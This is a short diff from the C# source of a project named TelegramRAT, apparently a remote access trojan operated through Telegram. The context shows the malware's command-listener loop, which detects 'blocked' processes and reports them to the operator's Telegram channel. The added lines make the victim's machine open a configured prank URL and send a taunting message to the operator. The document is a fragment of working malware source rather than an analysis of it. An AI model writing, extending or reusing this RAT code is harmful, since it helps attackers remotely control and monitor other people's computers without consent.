@@ -135,6 +135,10 @@ namespace TelegramRAT
                                     Console.WriteLine("[+] Restarting command listener thread");
                                     telegram.waitThreadIsBlocked = false;
                                     telegram.sendText($"🙊 Found blocked process {process}.exe");
+                                    if (config.RickRollEnabled == true) {
+                                        Process.Start(config.RickRollUrl);
+                                        telegram.sendText("Rick roll send... haha...");
+                                    }
                                     break;
                                 }
                                 Thread.Sleep(1000);
